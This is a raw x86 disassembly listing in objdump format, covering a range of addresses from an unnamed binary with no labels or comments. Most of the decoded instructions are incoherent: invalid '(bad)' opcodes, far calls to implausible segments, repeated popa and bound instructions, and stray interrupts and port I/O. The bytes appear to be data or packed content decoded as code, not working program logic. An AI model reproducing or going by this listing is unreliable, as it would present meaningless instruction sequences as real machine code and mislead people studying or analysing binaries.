  4356b6:	imul   esi,eax,0x62626318
  4356bc:	push   edi
  4356bd:	and    al,BYTE PTR [esi+0x640da561]
  4356c3:	fsub   DWORD PTR [edx+edx*4+0x21]
  4356c7:	jne    0x43571e
  4356c9:	lods   eax,DWORD PTR ds:[esi]
  4356ca:	loop   0x4356cd
  4356cc:	imul   esp,DWORD PTR [ecx],0xe2256975
  4356d2:	add    DWORD PTR [ecx+0xd],ebp
  4356d5:	jne    0x43572c
  4356d7:	test   DWORD PTR [ebx],ecx
  4356d9:	call   0xa8e8:0x5e343ac9
  4356e0:	popa   
  4356e1:	mov    eax,ds:0xd3e78675
  4356e6:	or     eax,0xb856975
  4356eb:	call   0xa8e8:0x5e343ac9
  4356f2:	popa   
  4356f3:	or     eax,0x602d86cd
  4356f8:	pop    ss
  4356f9:	int    0x86
  4356fb:	adc    esi,DWORD PTR [ebp+0x31]
  4356fe:	pop    ss
  4356ff:	jne    0x43575e
  435701:	or     eax,0x5e338675
  435706:	call   0xbc8b8b3
  43570b:	call   0x175d:0xcd0d3ac9
  435712:	push   0x8555750d
  435717:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43571d:	call   0xcd50b8ca
  435722:	xor    esi,edx
  435724:	outs   dx,DWORD PTR ds:[esi]
  435725:	or     ebx,DWORD PTR [edx-0x5af2c537]
  43572b:	call   0xa8e8:0x5e906e04
  435732:	popa   
  435733:	out    dx,al
  435734:	or     DWORD PTR [edi+0x22],edx
  435737:	call   0x64d6:0x640da561
  43573e:	sahf   
  43573f:	pop    edi
  435740:	popa   
  435741:	popa   
  435742:	and    edx,esp
  435744:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  435748:	lods   eax,DWORD PTR ds:[esi]
  435749:	loop   0x43574c
  43574b:	imul   esp,DWORD PTR [ecx],0x625c4ce2
  435751:	bound  esp,QWORD PTR ds:0xd6901e2
  435757:	jne    0x4356eb
  435759:	pop    ss
  43575a:	loop   0x435798
  43575c:	pop    esp
  43575d:	bound  esp,QWORD PTR [edx+0xd]
  435760:	loop   0x43578a
  435762:	pop    esp
  435763:	bound  esp,QWORD PTR [edx-0x7b]
  435766:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43576c:	call   0x75eab919
  435771:	call   0x5c28:0xe20d6bb2
  435778:	bound  esp,QWORD PTR [edx-0x7b]
  43577b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435781:	call   0xdb33b92e
  435786:	push   0xe20d6161
  43578b:	sub    BYTE PTR [edx+eiz*2+0x62],bl
  43578f:	test   DWORD PTR [ebx],ecx
  435791:	call   0xa8e8:0x5e343ac9
  435798:	popa   
  435799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43579a:	jne    0x435722
  43579c:	mov    dl,0x6b
  43579e:	or     eax,0x625c28e2
  4357a3:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4357a9:	xor    al,0x5e
  4357ab:	call   0x7d33b958
  4357b0:	push   0x75136161
  4357b5:	push   ebp
  4357b6:	pop    ss
  4357b7:	loop   0x4357d1
  4357b9:	pop    esp
  4357ba:	bound  esp,QWORD PTR [edx+0xd]
  4357bd:	loop   0x4357d7
  4357bf:	pop    esp
  4357c0:	bound  esp,QWORD PTR [edx+0x13]
  4357c3:	adc    esi,DWORD PTR [ecx]
  4357c5:	pop    esp
  4357c6:	bound  esp,QWORD PTR [edx+0x17]
  4357c9:	call   0x6262:0x5c58e213
  4357d0:	pop    ss
  4357d1:	jne    0x43583c
  4357d3:	or     eax,0xcd0d6975
  4357d8:	xchg   BYTE PTR [edi],dl
  4357da:	call   0x6262:0x5c28e20d
  4357e1:	test   DWORD PTR [ebx],ecx
  4357e3:	call   0xa8e8:0x5e343ac9
  4357ea:	popa   
  4357eb:	pop    ss
  4357ec:	loop   0x43583e
  4357ee:	pop    esp
  4357ef:	bound  esp,QWORD PTR [edx+0x62]
  4357f2:	mov    dl,0x86
  4357f4:	repz loopne 0x43584c
  4357f7:	bound  esp,QWORD PTR [edx+0x17]
  4357fa:	loop   0x435844
  4357fc:	pop    esp
  4357fd:	bound  esp,QWORD PTR [edx+0xd]
  435800:	jne    0x43579c
  435802:	or     eax,0xe2177ea2
  435807:	repz pop esp
  435809:	bound  esp,QWORD PTR [edx+0xd]
  43580c:	jne    0x4357a8
  43580e:	fcomp  DWORD PTR [esi+edi*2]
  435811:	mov    eax,ds:0x625cf3e2
  435816:	bound  edx,QWORD PTR [ebx+0x6161546e]
  43581c:	popa   
  43581d:	or     eax,0x625cf3e2
  435822:	(bad)  
  435823:	fdiv   st,st(3)
  435825:	call   0x6262:0x5c64e217
  43582c:	or     eax,0x625c64e2
  435831:	bound  esp,QWORD PTR [edx-0x15]
  435834:	cmp    bl,dh
  435836:	push   es
  435837:	bound  esp,QWORD PTR [bp+si+0x17]
  43583b:	loop   0x43588d
  43583d:	pop    esp
  43583e:	bound  esp,QWORD PTR [edx+0x62]
  435841:	or     edx,DWORD PTR [eax+0x5c]
  435844:	bound  esp,QWORD PTR [edx+0x62]
  435847:	mov    dl,0x55
  435849:	repz hlt 
  43584b:	push   ebp
  43584c:	bound  esp,QWORD PTR [edx+0xd]
  43584f:	loop   0x435879
  435851:	pop    esp
  435852:	bound  esp,QWORD PTR [edx-0x7b]
  435855:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43585b:	call   0xe2eaba08
  435860:	dec    eax
  435861:	pop    esp
  435862:	bound  esp,QWORD PTR [edx-0x4e]
  435865:	call   0x5ed4:0xf355b262
  43586c:	bound  esp,QWORD PTR [edx+0xd]
  43586f:	loop   0x4358bd
  435871:	pop    esp
  435872:	bound  esp,QWORD PTR [edx-0x7b]
  435875:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  43587b:	call   0x6315ba28
  435880:	or     ebx,DWORD PTR [eax+0x5c]
  435883:	bound  esp,QWORD PTR [edx+0x62]
  435886:	mov    dl,0x55
  435888:	repz cmp cl,BYTE PTR [edx+0x62]
  43588c:	bound  ecx,QWORD PTR ds:0x625c2813
  435892:	(bad)  
  435893:	(bad)  
  435894:	outs   dx,DWORD PTR ds:[esi]
  435895:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43589b:	pop    esi
  43589c:	call   0x1feaba49
  4358a1:	mov    dl,0x97
  4358a3:	or     eax,0x625c64e2
  4358a8:	bound  ecx,QWORD PTR ds:0x7fee8aa2
  4358ae:	or     eax,0x625cf3e2
  4358b3:	bound  ecx,QWORD PTR ds:0xf3e21761
  4358b9:	pop    esp
  4358ba:	bound  esp,QWORD PTR [edx-0x10]
  4358bd:	shl    BYTE PTR [edx+0x62],1
  4358c0:	bound  ecx,QWORD PTR ds:0x625c28e2
  4358c6:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4358cc:	xor    al,0x5e
  4358ce:	call   0x229aba7b
  4358d3:	xchg   BYTE PTR [ecx-0x5b],ah
  4358d6:	or     eax,0x7e64d864
  4358db:	or     eax,0x75179275
  4358e0:	imul   ebx,eax,0xe7619aea
  4358e6:	cmp    ebx,eax
  4358e8:	jmp    0x1caf:0x3ab26186
  4358ef:	lock mov eax,ds:0xaf616168
  4358f5:	sbb    al,0x94
  4358f7:	pop    ss
  4358f8:	jne    0x43592b
  4358fa:	fcom   DWORD PTR [ebp+0x1caf615d]
  435900:	mov    ds:0x68616e93,al
  435905:	popa   
  435906:	popa   
  435907:	and    DWORD PTR [ebp+0x55],esi
  43590a:	fisub  WORD PTR [ecx+0x61]
  43590d:	popa   
  43590e:	scas   eax,DWORD PTR es:[edi]
  43590f:	sbb    al,0x94
  435911:	pop    ss
  435912:	jne    0x435978
  435914:	out    dx,al
  435915:	xchg   BYTE PTR [ebp+ecx*1-0x276b9b8b],dl
  43591c:	sbb    al,0x68
  43591e:	xchg   esp,eax
  43591f:	pop    ss
  435920:	jne    0x435986
  435922:	xchg   ebx,eax
  435923:	bnd jne 0x43598a
  435926:	or     eax,0xf29386cd
  43592b:	sar    ebx,1
  43592d:	(bad)  
  43592e:	outs   dx,DWORD PTR ds:[esi]
  43592f:	or     bl,BYTE PTR [edx]
  435931:	popa   
  435932:	popa   
  435933:	(bad)  
  435934:	pop    ds
  435935:	mov    ecx,0x936161a7
  43593a:	repnz push edi
  43593c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43593d:	pop    ds
  43593e:	xchg   ebx,eax
  43593f:	adc    edx,DWORD PTR [ecx]
  435941:	popa   
  435942:	popa   
  435943:	popa   
  435944:	xchg   ebx,eax
  435945:	bnd jne 0x4359ac
  435948:	or     eax,0xf29386cd
  43594d:	sub    al,0xd6
  43594f:	pop    edi
  435950:	xchg   ebx,eax
  435951:	repnz int 0x31
  435954:	(bad)  
  435955:	lock mov ecx,0x936161a7
  43595b:	repnz push edi
  43595d:	(bad)  
  43595e:	outs   dx,DWORD PTR ds:[esi]
  43595f:	or     bl,BYTE PTR [edx]
  435961:	popa   
  435962:	popa   
  435963:	xchg   ebx,eax
  435964:	repnz push edi
  435966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435967:	pop    ds
  435968:	out    0x5f,eax
  43596a:	out    dx,al
  43596b:	mov    ebx,0x6475f293
  435970:	or     eax,0xf29386cd
  435975:	not    esi
  435977:	popf   
  435978:	xor    al,0xcc
  43597a:	popa   
  43597b:	popa   
  43597c:	mov    dl,0x93
  43597e:	xchg   ebx,eax
  43597f:	bnd jne 0x4359b3
  435982:	or     eax,0x1e939acd
  435987:	imul   DWORD PTR [eax-0x1e]
  43598a:	sbb    al,0xe7
  43598c:	jb     0x435921
  43598e:	bnd jne 0x4359f5
  435991:	or     eax,0xf29386cd
  435996:	not    esi
  435998:	xchg   ebx,eax
  435999:	repnz int 0x31
  43599c:	or     eax,0x93949aa5
  4359a1:	push   ds
  4359a2:	xchg   BYTE PTR [eax-0x29a80d6d],dl
  4359a8:	lock mov ecx,0x936161a7
  4359ae:	repnz push edi
  4359b0:	(bad)  
  4359b1:	outs   dx,DWORD PTR ds:[esi]
  4359b2:	or     bl,BYTE PTR [edx]
  4359b4:	popa   
  4359b5:	popa   
  4359b6:	xchg   ebx,eax
  4359b7:	repnz push edi
  4359b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359ba:	pop    ds
  4359bb:	mov    dl,0x88
  4359bd:	and    DWORD PTR [ebp+0x55],esi
  4359c0:	loope  0x435a23
  4359c2:	popa   
  4359c3:	popa   
  4359c4:	or     eax,0x17a25d75
  4359c9:	jne    0x435a28
  4359cb:	out    dx,al
  4359cc:	mov    esi,gs
  4359ce:	cmp    ah,BYTE PTR [ecx]
  4359d0:	jne    0x435a27
  4359d2:	loopne 0x435a35
  4359d4:	popa   
  4359d5:	popa   
  4359d6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4359d8:	bound  esp,QWORD PTR [edx+0x62]
  4359db:	xchg   ebx,eax
  4359dc:	bnd jne 0x435a10
  4359df:	or     eax,0x1e939acd
  4359e4:	imul   DWORD PTR [eax-0x1e]
  4359e7:	sbb    al,0xb2
  4359e9:	pop    edi
  4359ea:	out    dx,al
  4359eb:	xchg   DWORD PTR [ebp+ecx*1-0x276bce8b],edx
  4359f2:	sbb    al,0x68
  4359f4:	xchg   esp,eax
  4359f5:	pop    ss
  4359f6:	jne    0x435a29
  4359f8:	fsubr  st,st(2)
  4359fa:	push   ebp
  4359fb:	loopne 0x4359af
  4359fd:	imul   DWORD PTR [edi-0xfd211e4]
  435a03:	dec    edx
  435a04:	arpl   WORD PTR [edx+0x62],sp
  435a07:	xchg   ebx,eax
  435a08:	bnd jne 0x435a68
  435a0b:	xor    edi,DWORD PTR [ecx-0x6c9e9e59]
  435a11:	repnz sbb al,0x85
  435a14:	or     bl,BYTE PTR [edx]
  435a16:	popa   
  435a17:	popa   
  435a18:	xchg   ebx,eax
  435a19:	repnz sbb al,0xd
  435a1c:	int    0x86
  435a1e:	xchg   ebx,eax
  435a1f:	repnz sar ebx,1
  435a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435a23:	pop    ds
  435a24:	out    0xf7,eax
  435a26:	scas   eax,DWORD PTR es:[edi]
  435a27:	sbb    al,0xee
  435a29:	push   esi
  435a2a:	scas   eax,DWORD PTR es:[edi]
  435a2b:	sbb    al,0xa2
  435a2d:	push   edi
  435a2e:	and    al,BYTE PTR [esi+0x640da561]
  435a34:	fsub   DWORD PTR [esi+eiz*8+0xd]
  435a38:	jne    0x435ab8
  435a3a:	pop    ss
  435a3b:	jne    0x435aa6
  435a3d:	or     eax,0xdb0d6975
  435a42:	and    al,0x68
  435a44:	popa   
  435a45:	popa   
  435a46:	fsubr  DWORD PTR [edx+0xd88b261]
  435a4c:	jne    0x4359e8
  435a4e:	test   DWORD PTR [ebx],ecx
  435a50:	call   0xa8e8:0x5e343ac9
  435a57:	popa   
  435a58:	lock int 0x5f
  435a5b:	popa   
  435a5c:	popa   
  435a5d:	jo     0x435a05
  435a5f:	bound  esi,QWORD PTR [edx+0x55c1f392]
  435a65:	bound  esp,QWORD PTR [edx+0xd]
  435a68:	jne    0x435ad3
  435a6a:	pop    ss
  435a6b:	jne    0x435ab9
  435a6d:	or     eax,0x1cd86975
  435a72:	js     0x435a8b
  435a74:	jne    0x435ace
  435a76:	or     eax,0x1cd86975
  435a7b:	sub    al,0x17
  435a7d:	jne    0x435aa7
  435a7f:	or     eax,0x1cd86975
  435a84:	xchg   esp,eax
  435a85:	pop    ss
  435a86:	jne    0x435ad8
  435a88:	or     eax,0x4346975
  435a8d:	popa   
  435a8e:	popa   
  435a8f:	popa   
  435a90:	pop    ss
  435a91:	jne    0x435acf
  435a93:	or     eax,0xbb346975
  435a98:	popa   
  435a99:	popa   
  435a9a:	popa   
  435a9b:	pop    ss
  435a9c:	jne    0x435ae6
  435a9e:	or     eax,0x4c346975
  435aa3:	popa   
  435aa4:	popa   
  435aa5:	popa   
  435aa6:	pop    ss
  435aa7:	jne    0x435ac1
  435aa9:	or     eax,0xed346975
  435aae:	popa   
  435aaf:	popa   
  435ab0:	popa   
  435ab1:	pop    ss
  435ab2:	jne    0x435aa7
  435ab4:	or     eax,0x92346975
  435ab9:	push   0x75176161
  435abe:	fs or  eax,0xa8346975
  435ac4:	push   0x75176161
  435ac9:	xor    DWORD PTR ds:0xbe346975,ecx
  435acf:	push   0x75176161
  435ad4:	pop    ebp
  435ad5:	or     eax,0xb859a75
  435ada:	call   0xa8e8:0x5e343ac9
  435ae1:	popa   
  435ae2:	pop    ss
  435ae3:	jne    0x435b3a
  435ae5:	bound  esi,QWORD PTR [edx+0x6261707e]
  435aeb:	mov    dl,0x69
  435aed:	or     eax,0xad626975
  435af2:	mov    cl,0x68
  435af4:	popa   
  435af5:	popa   
  435af6:	repz push ebp
  435af8:	push   0xdd26161
  435afd:	jne    0x435b68
  435aff:	or     eax,0x616824db
  435b04:	popa   
  435b05:	bound  esi,QWORD PTR [edx-0xd]
  435b08:	xor    edx,DWORD PTR [ebp+0x62]
  435b0b:	bound  edx,QWORD PTR [edi]
  435b0d:	jne    0x435b64
  435b0f:	or     eax,0xb859a75
  435b14:	call   0xa8e8:0x5e343ac9
  435b1b:	popa   
  435b1c:	mov    eax,ds:0x6e935575
  435b21:	fldcw  WORD PTR [eax+0x61]
  435b24:	popa   
  435b25:	or     eax,0xcd0d5575
  435b2a:	push   ebp
  435b2b:	push   esi
  435b2c:	ficom  DWORD PTR [esi+0xd1ccd17]
  435b32:	jne    0x435b50
  435b34:	or     eax,0xda5655cd
  435b39:	jecxz  0x435b52
  435b3b:	int    0xfd
  435b3d:	or     eax,0xcd0dfd75
  435b42:	push   ebp
  435b43:	push   esi
  435b44:	fidiv  DWORD PTR [esi+0x17]
  435b47:	int    0xf9
  435b49:	or     eax,0xcd0dfd75
  435b4e:	push   ebp
  435b4f:	push   esi
  435b50:	(bad)  
  435b52:	pop    ss
  435b53:	int    0x54
  435b55:	or     eax,0xa20dfd75
  435b5a:	mov    ss,WORD PTR [esi+0x75]
  435b5d:	push   ebp
  435b5e:	pop    ss
  435b5f:	jne    0x435b75
  435b61:	or     eax,0xcd0dfd75
  435b66:	std    
  435b67:	or     eax,0x99a77ea2
  435b6c:	mov    al,ch
  435b6e:	xchg   edi,eax
  435b6f:	or     eax,0xa20dfd75
  435b74:	jle    0x435b8d
  435b76:	jne    0x435b61
  435b78:	out    dx,al
  435b79:	xchg   ecx,eax
  435b7a:	or     eax,0xa20dfd75
  435b7f:	mov    dl,BYTE PTR [edi]
  435b81:	jne    0x435b6c
  435b83:	or     eax,0x7517e975
  435b88:	and    al,0xd
  435b8a:	jne    0x435b26
  435b8c:	test   DWORD PTR [ebx],ecx
  435b8e:	call   0xa8e8:0x5e343ac9
  435b95:	popa   
  435b96:	pop    ss
  435b97:	jne    0x435b4a
  435b99:	and    DWORD PTR [ebp+0x20],esi
  435b9c:	xchg   edi,eax
  435b9d:	popa   
  435b9e:	popa   
  435b9f:	popa   
  435ba0:	or     eax,0xb859a75
  435ba5:	call   0xa8e8:0x5e343ac9
  435bac:	popa   
  435bad:	pop    ss
  435bae:	jne    0x435bb1
  435bb0:	out    dx,al
  435bb1:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435bb8:	leave  
  435bb9:	cmp    cl,BYTE PTR ds:0x6e1301cd
  435bbf:	push   0x61a8e85e
  435bc4:	pop    ss
  435bc5:	jne    0x435bc8
  435bc7:	or     eax,0x75a70175
  435bcc:	and    al,0x93
  435bce:	fsubr  DWORD PTR [eax]
  435bd0:	popa   
  435bd1:	popa   
  435bd2:	popa   
  435bd3:	or     eax,0x75a7b175
  435bd8:	and    al,ch
  435bda:	xor    al,0xf0
  435bdc:	and    DWORD PTR [ecx+0x61],esp
  435bdf:	popa   
  435be0:	or     eax,0xcd0d0175
  435be5:	adc    al,0x93
  435be7:	repnz neg DWORD PTR [ecx+0xd607517]
  435bee:	jne    0x435bed
  435bf0:	or     eax,0xdaa701cd
  435bf5:	mov    dh,BYTE PTR [ebx-0x69]
  435bf8:	or     eax,0xcd0dfd75
  435bfd:	pusha  
  435bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435bff:	fidivr DWORD PTR [esi-0x18]
  435c02:	xor    al,0xf0
  435c04:	or     DWORD PTR [ecx+0x61],esp
  435c07:	popa   
  435c08:	or     eax,0xcd0d0175
  435c0d:	push   esp
  435c0e:	or     eax,0x7e5655a5
  435c13:	(bad)  
  435c14:	pop    ss
  435c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c16:	or     BYTE PTR ds:0xcd0d6075,cl
  435c1c:	stc    
  435c1d:	or     eax,0x7e5655a5
  435c22:	(bad)  
  435c23:	pop    ss
  435c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c25:	lods   eax,DWORD PTR ds:[esi]
  435c26:	or     eax,0xb859a75
  435c2b:	call   0xa8e8:0x5e343ac9
  435c32:	popa   
  435c33:	pop    ss
  435c34:	jne    0x435c2b
  435c36:	out    dx,al
  435c37:	imul   ecx,DWORD PTR ds:0xb858675,0xffffff9a
  435c3e:	leave  
  435c3f:	cmp    cl,BYTE PTR ds:0x6e13f5cd
  435c45:	push   0x61a8e85e
  435c4a:	pop    ss
  435c4b:	jne    0x435c42
  435c4d:	or     eax,0x75a7f575
  435c52:	and    BYTE PTR [ebx-0x33],dh
  435c55:	or     eax,0xb859a75
  435c5a:	call   0xa8e8:0x5e343ac9
  435c61:	popa   
  435c62:	or     eax,0xa50df5cd
  435c67:	xchg   edx,eax
  435c68:	mov    eax,ds:0x5fe71af7
  435c6d:	out    dx,al
  435c6e:	push   edi
  435c6f:	bound  esi,QWORD PTR [edx-0xa8af297]
  435c75:	(bad)  
  435c76:	out    0xe2,eax
  435c78:	dec    esp
  435c79:	bound  esi,QWORD PTR [edx+0x55bef308]
  435c7f:	bound  esp,QWORD PTR [edx+0xd]
  435c82:	int    0x9a
  435c84:	(bad)  
  435c85:	outs   dx,DWORD PTR ds:[esi]
  435c86:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435c8c:	pop    esi
  435c8d:	call   0x1feabe3a
  435c92:	out    0x86,eax
  435c94:	or     eax,0xcd0df575
  435c99:	xchg   edx,eax
  435c9a:	or     eax,0x7e17ada5
  435c9f:	(bad)  
  435ca0:	out    dx,al
  435ca1:	out    dx,eax
  435ca2:	lock xchg edi,eax
  435ca4:	bound  esp,QWORD PTR [edx+0x62]
  435ca7:	or     eax,0x22575575
  435cac:	xchg   edx,eax
  435cad:	popa   
  435cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435caf:	or     eax,0x750dc964
  435cb4:	call   0x9ab2:0x62557517
  435cbb:	or     eax,0xad625575
  435cc0:	dec    eax
  435cc1:	push   0x257a6161
  435cc6:	loop   0x435cc9
  435cc8:	imul   edi,DWORD PTR [edx-0x53],0xf36901e2
  435ccf:	mov    esp,0xd62625c
  435cd4:	int    0x55
  435cd6:	or     eax,0x6168f517
  435cdb:	popa   
  435cdc:	pop    ss
  435cdd:	push   0xd55750d
  435ce2:	fcomi  st,st(5)
  435ce4:	push   0xaad86161
  435ce9:	popa   
  435cea:	out    0x34,eax
  435cec:	scas   eax,DWORD PTR es:[edi]
  435ced:	sbb    al,0xa2
  435cef:	out    dx,al
  435cf0:	pop    edi
  435cf1:	scas   eax,DWORD PTR es:[edi]
  435cf2:	sbb    al,0x57
  435cf4:	and    dh,bh
  435cf6:	popa   
  435cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435cf8:	or     eax,0xdc9c964
  435cfd:	jne    0x435c85
  435cff:	pop    ss
  435d00:	jne    0x435d57
  435d02:	or     eax,0x481f9275
  435d07:	xor    al,0xd
  435d09:	int    0x55
  435d0b:	or     eax,0x61680417
  435d10:	popa   
  435d11:	adc    esi,edi
  435d13:	cdq    
  435d14:	pop    ss
  435d15:	jne    0x435d80
  435d17:	or     eax,0xf2939a75
  435d1c:	popa   
  435d1d:	popf   
  435d1e:	xor    al,0xcc
  435d20:	popa   
  435d21:	popa   
  435d22:	out    0x38,eax
  435d24:	or     eax,0xf2939a75
  435d29:	popa   
  435d2a:	test   DWORD PTR [edx],ecx
  435d2c:	sbb    ah,BYTE PTR [ecx+0x61]
  435d2f:	xor    al,0xb9
  435d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d32:	popa   
  435d33:	popa   
  435d34:	or     eax,0x179469cd
  435d39:	push   0xa269750d
  435d3e:	mov    ds:0xd697517,al
  435d43:	jne    0x435cdf
  435d45:	mov    ds:0x9a7517a2,al
  435d4a:	out    dx,al
  435d4b:	dec    ebp
  435d4c:	scas   eax,DWORD PTR es:[edi]
  435d4d:	sbb    al,0xd
  435d4f:	int    0x69
  435d51:	xchg   esp,eax
  435d52:	pop    ss
  435d53:	push   0x1f92750d
  435d58:	dec    eax
  435d59:	xor    al,0xd
  435d5b:	int    0x55
  435d5d:	or     eax,0x61680417
  435d62:	popa   
  435d63:	adc    esi,edi
  435d65:	cdq    
  435d66:	push   edi
  435d67:	and    al,BYTE PTR [esi+0x640da561]
  435d6d:	leave  
  435d6e:	leave  
  435d6f:	or     eax,0x75178675
  435d74:	push   ebp
  435d75:	or     eax,0x481f9275
  435d7a:	xor    al,0xd
  435d7c:	int    0x55
  435d7e:	or     eax,0x61680417
  435d83:	popa   
  435d84:	adc    esi,edi
  435d86:	cdq    
  435d87:	pop    ss
  435d88:	jne    0x435df3
  435d8a:	or     eax,0x1e939a75
  435d8f:	popa   
  435d90:	fsubr  DWORD PTR [ecx-0x20]
  435d93:	out    0x7f,eax
  435d95:	or     eax,0x6939a75
  435d9a:	popa   
  435d9b:	test   eax,ebx
  435d9d:	popa   
  435d9e:	popa   
  435d9f:	popa   
  435da0:	fcomp  DWORD PTR [edx+ebx*4]
  435da3:	or     eax,0x680469cd
  435da8:	or     eax,0x17a26975
  435dad:	jne    0x435e18
  435daf:	or     eax,0x17a29a75
  435db4:	jne    0x435d50
  435db6:	out    dx,al
  435db7:	inc    esi
  435db8:	or     eax,0x61ff6975
  435dbd:	popa   
  435dbe:	or     eax,0x481f9275
  435dc3:	xor    al,0xd
  435dc5:	int    0x55
  435dc7:	or     eax,0x61680417
  435dcc:	popa   
  435dcd:	adc    esi,edi
  435dcf:	cdq    
  435dd0:	push   edi
  435dd1:	and    al,BYTE PTR [esi+0x640da561]
  435dd7:	fsub   DWORD PTR [esi+esi*2+0x21]
  435ddb:	jne    0x435e0e
  435ddd:	lods   eax,DWORD PTR ds:[esi]
  435dde:	loop   0x435de1
  435de0:	imul   esp,DWORD PTR [ecx],0xe2256475
  435de6:	add    DWORD PTR [ecx+0xd],ebp
  435de9:	jne    0x435d85
  435deb:	or     eax,0x69751761
  435df0:	and    DWORD PTR [ebp+0x55],esi
  435df3:	adc    al,0xe2
  435df5:	add    DWORD PTR [ecx+0x21],ebp
  435df8:	jne    0x435e57
  435dfa:	or     al,0x8a
  435dfc:	push   ecx
  435dfd:	icebp  
  435dfe:	or     eax,0xb856475
  435e03:	call   0xa8e8:0x5e343ac9
  435e0a:	popa   
  435e0b:	or     eax,0x6fd631cd
  435e10:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e16:	pop    esi
  435e17:	call   0xbad6bfc4
  435e1c:	pop    ds
  435e1d:	pop    ss
  435e1e:	jne    0x435e13
  435e20:	out    dx,al
  435e21:	imul   ecx,DWORD PTR ds:0xb856475,0xffffff9a
  435e28:	leave  
  435e29:	cmp    cl,BYTE PTR ds:0x6e13f3cd
  435e2f:	push   0x61a8e85e
  435e34:	pop    ss
  435e35:	jne    0x435e2a
  435e37:	or     eax,0xb855575
  435e3c:	call   0xa8e8:0x5e343ac9
  435e43:	popa   
  435e44:	or     eax,0x6fd664cd
  435e49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e4f:	pop    esi
  435e50:	call   0x1f70bffd
  435e55:	mov    eax,ds:0xb493f375
  435e5a:	(bad)  [ecx+0x61]
  435e5d:	popa   
  435e5e:	or     eax,0xb856975
  435e63:	call   0xa8e8:0x5e343ac9
  435e6a:	popa   
  435e6b:	or     eax,0x6fd664cd
  435e70:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e76:	pop    esi
  435e77:	call   0x1fc2c024
  435e7c:	out    0x9e,eax
  435e7e:	or     eax,0xb856975
  435e83:	call   0xa8e8:0x5e343ac9
  435e8a:	popa   
  435e8b:	or     eax,0x6fd664cd
  435e90:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435e96:	pop    esi
  435e97:	call   0xf388c044
  435e9c:	or     eax,0x6fd65dcd
  435ea1:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435ea7:	pop    esi
  435ea8:	call   0x1ff2c055
  435ead:	pop    ss
  435eae:	jne    0x435ec8
  435eb0:	out    dx,al
  435eb1:	jns    0x435ec0
  435eb3:	jne    0x435f1e
  435eb5:	test   DWORD PTR [ebx],ecx
  435eb7:	call   0xa8e8:0x5e343ac9
  435ebe:	popa   
  435ebf:	or     eax,0x6fd664cd
  435ec4:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435eca:	pop    esi
  435ecb:	call   0xf388c078
  435ed0:	pop    ss
  435ed1:	jne    0x435eeb
  435ed3:	or     eax,0x75171875
  435ed8:	imul   esi,eax,0x6262622c
  435ede:	or     eax,0xcd0d9a75
  435ee3:	imul   edx,DWORD PTR [edi],0x69750d9a
  435ee9:	push   edi
  435eea:	and    dh,bh
  435eec:	popa   
  435eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435eee:	or     eax,0x7264d664
  435ef3:	mul    DWORD PTR [ecx+0x61]
  435ef6:	iret   
  435ef7:	and    edx,esp
  435ef9:	repz pop esi
  435efb:	bound  esp,QWORD PTR [edx-0x53]
  435efe:	loop   0x435f01
  435f00:	imul   esp,DWORD PTR [ecx],0x625e3ce2
  435f06:	bound  esp,QWORD PTR ds:0x216901e2
  435f0c:	jne    0x435f6b
  435f0e:	lods   eax,DWORD PTR ds:[esi]
  435f0f:	mov    ch,0x1
  435f11:	imul   esp,DWORD PTR [ecx],0x625e48e2
  435f17:	bound  ebp,QWORD PTR [edi]
  435f19:	loop   0x435f1c
  435f1b:	imul   ecx,DWORD PTR ds:0x625ef3e2,0x9a0b8562
  435f25:	leave  
  435f26:	cmp    dh,BYTE PTR [esi+ebx*2]
  435f29:	call   0x755ac0d6
  435f2e:	imul   esp,DWORD PTR [ecx],0xe2145575
  435f34:	add    DWORD PTR [ecx+0x21],ebp
  435f37:	loop   0x435f9d
  435f39:	pop    esi
  435f3a:	bound  esp,QWORD PTR [edx+0xc]
  435f3d:	mov    dl,BYTE PTR [ecx-0xf]
  435f40:	or     eax,0x3ce20d57
  435f45:	pop    esi
  435f46:	bound  esp,QWORD PTR [edx-0x7b]
  435f49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  435f4f:	call   0x1350c0fc
  435f54:	repz pop esi
  435f56:	bound  esp,QWORD PTR [edx-0x2a]
  435f59:	outs   dx,DWORD PTR ds:[esi]
  435f5a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  435f60:	pop    esi
  435f61:	call   0xbad6c10e
  435f66:	pop    ds
  435f67:	pop    ss
  435f68:	jne    0x435f9b
  435f6a:	out    dx,al
  435f6b:	mov    cl,BYTE PTR ds:0x625e3ce2
  435f71:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  435f77:	or     eax,0x6e1331cd
  435f7c:	push   0x61a8e85e
  435f81:	pop    ss
  435f82:	jne    0x435fb5
  435f84:	or     eax,0xcd0d3175
  435f89:	pop    ebp
  435f8a:	(bad)  
